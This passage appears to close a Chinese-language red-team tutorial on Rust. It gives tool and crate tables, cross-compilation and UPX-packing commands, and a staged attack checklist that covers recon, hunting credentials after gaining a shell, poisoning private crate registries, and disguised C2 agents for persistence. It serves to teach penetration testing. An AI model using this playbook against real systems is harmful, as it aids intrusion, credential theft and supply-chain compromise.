| **rustscan** | 高速端口扫描 | `pacman -S rustscan` | `rustscan -a IP -- -sV -sC` |
| **feroxbuster** | 目录/文件爆破 | `pacman -S feroxbuster` | `feroxbuster -u URL -w wordlist -x php` |
| **ripgrep (rg)** | 文本搜索 | `pacman -S ripgrep` | `rg -i "password" /var/www/` |
| **fd** | 文件查找 | `pacman -S fd` | `fd -e conf . /etc/` |
| **x8** | HTTP参数发现 | `cargo install x8` | `x8 -u URL -w params.txt` |
| **subxtract** | 子域名枚举 | `cargo install subxtract` | `subxtract -d domain -w wordlist` |
| **bat** | 代码/文件预览 | `pacman -S bat` | `bat config.php` |
| **tokei** | 代码统计 | `cargo install tokei` | `tokei /var/www/html/` |
| **cargo-audit** | 依赖漏洞审计 | `cargo install cargo-audit` | `cargo audit` |
| **cargo-outdated** | 过期依赖检查 | `cargo install cargo-outdated` | `cargo outdated` |
| **cargo-deny** | 依赖策略检查 | `cargo install cargo-deny` | `cargo deny check` |
| **rustfilt** | 符号反魔改 | `cargo install rustfilt` | `nm binary \| rustfilt` |
| **cargo-fuzz** | 覆盖率引导fuzz | `cargo install cargo-fuzz` | `cargo fuzz run fuzz_target` |

### 常用 Crate 速查表（写红队工具用）

| Crate | 用途 | 版本 | Cargo.toml 片段 |
|-------|------|------|-----------------|
| `reqwest` | HTTP 客户端 | 0.12 | `reqwest = { version = "0.12", features = ["json", "cookies"] }` |
| `tokio` | 异步运行时 | 1 | `tokio = { version = "1", features = ["full"] }` |
| `clap` | CLI 参数解析 | 4 | `clap = { version = "4", features = ["derive"] }` |
| `serde_json` | JSON 处理 | 1 | `serde_json = "1"` |
| `base64` | Base64 编解码 | 0.22 | `base64 = "0.22"` |
| `rand` | 随机数 | 0.8 | `rand = "0.8"` |
| `rayon` | 数据并行 | 1.10 | `rayon = "1.10"` |
| `colored` | 终端颜色 | 2 | `colored = "2"` |
| `trust-dns-resolver` | DNS 解析 | 0.23 | `trust-dns-resolver = "0.23"` |
| `urlencoding` | URL 编解码 | 2 | `urlencoding = "2"` |
| `pnet` | 原始包构造 | 0.35 | `pnet = "0.35"` |
| `rustls` | 纯 Rust TLS | 0.23 | （reqwest 可选依赖） |

### Rust 目标架构交叉编译速查

```bash
# 安装交叉编译目标
rustup target add x86_64-pc-windows-gnu # Windows 64位
rustup target add x86_64-unknown-linux-musl # Linux 静态链接
rustup target add aarch64-unknown-linux-gnu # ARM64 Linux
rustup target add aarch64-linux-android # Android ARM64
rustup target add x86_64-apple-darwin # macOS Intel (需要 macOS SDK)

# 编译 Windows 版本
cargo build --release --target x86_64-pc-windows-gnu

# 编译静态链接 Linux 版本
cargo build --release --target x86_64-unknown-linux-musl

# 减小二进制体积
# Cargo.toml:
# [profile.release]
# opt-level = "z" # 优化体积
# lto = true # 链接时优化
# codegen-units = 1 # 更好的 LTO
# strip = true # 去除符号

# 进一步压缩
strip target/release/binary
upx --best --lzma target/release/binary
```

### 实战建议与攻击思路整合

**侦察阶段：**
1. `rustscan` 快速扫描 C 段 → 发现存活主机和端口
2. `feroxbuster` 对 Web 端口做目录爆破
3. 识别后端技术栈：是 actix-web、Rocket 还是其他 Rust 框架？
4. `ripgrep` 搜索泄露的 API 文档/源代码（如果有路径）

**初始访问阶段：**
5. 用 `x8` 发现隐藏的 HTTP 参数
6. 用自己写的 Rust HTTP fuzzer（实战6）测试输入验证漏洞
7. 用 WAF 绕过脚本（实战 11）测试 payload 编码变体
8. 对 Rust 后端做针对性 fuzzing（null 值、非法 UTF-8、超大输入）

**后渗透阶段：**
9. 拿到 shell 后，`fd` 快速定位配置文件/密钥/数据库文件
10. `ripgrep` 搜索密码、token、API key
11. `bat` 查看配置文件内容
12. 如果目标有 Rust 组件，用源码侦察脚本（实战 14）分析二进制

**横向移动/供应链：**
13. 审计目标环境中的 Cargo.toml/Cargo.lock（`cargo audit`）
14. 检查是否有已知漏洞的依赖 → 利用这些漏洞
15. 如果目标内部有私有 crate 仓库 → 供应链投毒

**持久化：**
16. 用 Rust 写无依赖的 C2 agent（单文件二进制，无需运行时）
17. 伪装成正常系统服务（Rust 进程特征和 C 程序难以区分）
18. 利用 musl 静态编译 → 丢到任何 Linux 上都能跑

---

> **下一篇推荐：** 回到 [[../总目录与快速查询]] 或 [[../新手推荐学习方向]] 选择下一阶段学习目标。如果你已经掌握了本教程的内容，建议 [实战 14 的二进制分析] 和 [cargo-audit 依赖审计] 是投入产出比最高的两个技能点 —— 前者让你看懂目标系统和逆向 Rust 二进制，后者让你站在供应链的角度思考攻击。
>
> **练习建议：**
> 1. 用 `rustscan + feroxbuster` 扫描一台测试靶机，记录完整流程
> 2. 用本教程提供的代码（实战 8、9、10）分别编译运行一次
> 3. 在 GitHub 上找一个 Rust Web 项目，用 `cargo audit` 审计其依赖
> 4. 用 `strings` + `nm` + `objdump` 分析一个 Rust 编译的二进制文件
